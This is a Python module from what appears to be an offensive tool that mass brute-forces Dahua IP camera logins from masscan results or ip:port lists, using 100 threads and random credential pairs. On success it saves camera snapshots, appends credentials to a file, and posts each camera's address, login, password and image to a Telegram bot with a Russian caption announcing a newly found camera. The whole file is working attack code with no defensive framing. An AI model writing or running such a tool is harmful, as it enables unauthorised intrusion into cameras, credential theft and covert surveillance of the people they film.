from __future__ import annotations

from .dahua import DahuaController
from . import combinations
from . import parse_masscan
import logging
import os
from datetime import datetime
from pathlib import Path
import concurrent.futures
import re
import threading
import requests
from tqdm import tqdm

LOGGING_FOLDER = Path("dahua_logs")
SNAPSHOTS_FOLDER = Path("snapshots")

LOGGING_FOLDER.mkdir(parents=True, exist_ok=True)
SNAPSHOTS_FOLDER.mkdir(parents=True, exist_ok=True)

log_filename = LOGGING_FOLDER / f'log_{datetime.now().strftime("%Y%m%d-%H%M%S")}.log'
logging.basicConfig(
    filename=str(log_filename),
    level=logging.INFO,
    format='[%(asctime)s] {%(pathname)s:%(lineno)d} %(levelname)s - %(message)s',
    datefmt='%H:%M:%S'
)

stats_lock = threading.Lock()
snapshots_count = 0
alive_count = 0
blocked_count = 0
bruted_devices = []


def post_tg(token: str, chat_id: str | int, device: tuple[str, int], ss_path: str | None, login: str, password: str) -> bool:
    if not token or not chat_id:
        return False

    url = f"https://api.telegram.org/bot{token}"
    caption = (
        "📷 <b>нашел новую камеру</b>\n\n"
        f"🌐 айпи: <code>{device[0]}</code>\n"
        f"🌐 порт: <code>{device[1]}</code>\n\n"
        f"👤 логин: <code>{login}</code>\n"
        f"🔑 пароль: <code>{password}</code>"
    )

    try:
        if ss_path and os.path.exists(ss_path):
            with open(ss_path, "rb") as ph:
                files = {"photo": ("snapshot.jpg", ph, "image/jpeg")}
                data = {
                    "chat_id": chat_id,
                    "caption": caption,
                    "parse_mode": "HTML"
                }
                resp = requests.post(f"{url}/sendPhoto", data=data, files=files, timeout=15)
        else:
            data = {
                "chat_id": chat_id,
                "text": caption,
                "parse_mode": "HTML"
            }
            resp = requests.post(f"{url}/sendMessage", data=data, timeout=15)

        if resp.status_code == 200:
            logging.debug(f"user was successfully notified about {device[0]}:{device[1]}")
            return True
        else:
            logging.error(f"tg api notification error ({resp.status_code}): {resp.text}")
            return False
    except Exception as e:
        logging.error(f"error when notifying via tg: {e}")
        return False


def get_snapshot(ip: str, port: int, login: str, passw: str) -> str | None:
    global snapshots_count
    try:
        logging.info(f"connecting to {ip}:{port} for snapshot...")
        with DahuaController(ip, port, login, passw) as cam:
            if cam.status != 0:
                return None

            chns = max(1, cam.channels_count)
            for chn in range(chns):
                try:
                    jpeg = cam.get_snapshot(chn)
                    if not jpeg or len(jpeg) < 100:
                        continue

                    safe_login = re.sub(r'[^\w\-]', '_', login)
                    safe_pass = re.sub(r'[^\w\-]', '_', passw)
                    filename = f"{ip}_{port}_{safe_login}_{safe_pass}_ch{chn}.jpg"
                    file_path = SNAPSHOTS_FOLDER / filename

                    with open(file_path, "wb") as ss:
                        ss.write(jpeg)

                    with stats_lock:
                        snapshots_count += 1

                    logging.info(f"({ip}:{port}) saved snapshot of channel {chn}")
                    return str(file_path)
                except Exception as e:
                    logging.info(f"({ip}:{port}) channel {chn} snapshot error: {e}")
                    continue
    except Exception as e:
        logging.error(f"snapshot error for {ip}:{port}: {e}")

    return None


def dhlogin(ip: str, port: int, login: str, passw: str):
    global alive_count, blocked_count

    logging.info(f"trying to login {ip}:{port} with credentials {login}:{passw}")
    try:
        with DahuaController(ip, port, login, passw) as cam:
            if cam.status == 0:
                logging.info(f"{ip}:{port} logged in successfully")
                with stats_lock:
                    alive_count += 1
                return ip, port, login, passw
            elif cam.status == 2:
                logging.warning(f"{ip}:{port} is blocked")
                with stats_lock:
                    blocked_count += 1
                return "blocked"
            else:
                logging.debug(f"unable to login {ip}:{port} with {login}:{passw}")
                return None
    except Exception as e:
        logging.debug(f"connection error to {ip}:{port}: {e}")
        return None


def check_host(host_str: str, cred_list: list, dosnap: bool, notify: bool, token: str | None, chat_id: int | str | None):
    host_str = host_str.strip()
    match = re.match(r"^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})$", host_str)
    if not match:
        logging.warning(f"{host_str} is not a valid address (expected ip:port), skipping")
        return "dead"

    ip = match.group(1)
    port = int(match.group(2))

    for login, password in cred_list:
        res = dhlogin(ip, port, login, password)
        if res == "blocked":
            logging.warning(f"{ip}:{port} blocked login attempts, stopping")
            return "blocked"
        elif res:
            with stats_lock:
                bruted_devices.append((ip, port, login, password))

            ss_path = None
            if dosnap:
                ss_path = get_snapshot(ip, port, login, password)

            if notify and token and chat_id:
                post_tg(token, chat_id, (ip, port), ss_path, login, password)

            return res

    return "dead"


def read_targets(file_path: str) -> list[str]:
    path = Path(file_path)
    if not path.is_file():
        raise FileNotFoundError(f"targets file not found: {file_path}")

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        first_line = f.readline()
        f.seek(0)
        content = f.read()

    if "#masscan" in first_line or "open tcp" in content or "Discovered open port" in content or content.strip().startswith("["):
        return parse_masscan.parse(str(path))

    return [line.strip() for line in content.splitlines() if line.strip() and not line.strip().startswith("#")]


def brute(
    token: str | None = None,
    id: int | str | None = None,
    brute_file_path: str = "input.txt",
    dosnap: bool = True,
    threads: int = 100,
    notify: bool = True,
    status_callback=None,
    show_progress: bool = True
) -> list:
    global bruted_devices
    bruted_devices = []

    try:
        devices = read_targets(brute_file_path)
    except Exception as e:
        logging.error(f"failed to read targets: {e}")
        raise

    if not devices:
        logging.warning("no valid devices found in target file")
        return []

    logging.info(f"loaded {len(devices)} target devices from {brute_file_path}")

    workers = []
    authed_count = 0
    blocked_count = 0
    dead_count = 0

    pbar = None
    if show_progress:
        pbar = tqdm(
            total=len(devices),
            bar_format='[{n_fmt}/{total_fmt}] {bar} | {desc}',
            dynamic_ncols=True
        )
        pbar.set_description_str(f"authed: {authed_count} * blocked: {blocked_count} * dead: {dead_count}")

    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            for device in devices:
                creds = combinations.get_random(5)
                future = executor.submit(
                    check_host,
                    device,
                    creds,
                    dosnap,
                    notify,
                    token,
                    id
                )
                workers.append(future)

            for future in concurrent.futures.as_completed(workers):
                try:
                    res = future.result()
                    if isinstance(res, tuple) and len(res) == 4:
                        authed_count += 1
                        if status_callback:
                            status_callback(res)
                    elif res == "blocked":
                        blocked_count += 1
                    else:
                        dead_count += 1
                except Exception as e:
                    logging.debug(f"worker exception: {e}")
                    dead_count += 1
                finally:
                    if pbar is not None:
                        pbar.set_description_str(f"authed: {authed_count} * blocked: {blocked_count} * dead: {dead_count}")
                        pbar.update(1)

    except KeyboardInterrupt:
        logging.warning("scanning interrupted by user")
        for w in workers:
            w.cancel()
    except Exception as e:
        logging.error(f"bruteforcing was interrupted: {e}")
        for w in workers:
            w.cancel()
    finally:
        if pbar is not None:
            pbar.close()

    if bruted_devices:
        results_file = Path("found_devices.txt")
        with open(results_file, "a", encoding="utf-8") as out:
            for ip, port, login, password in bruted_devices:
                out.write(f"{ip}:{port} {login}:{password}\n")

    return list(bruted_devices)
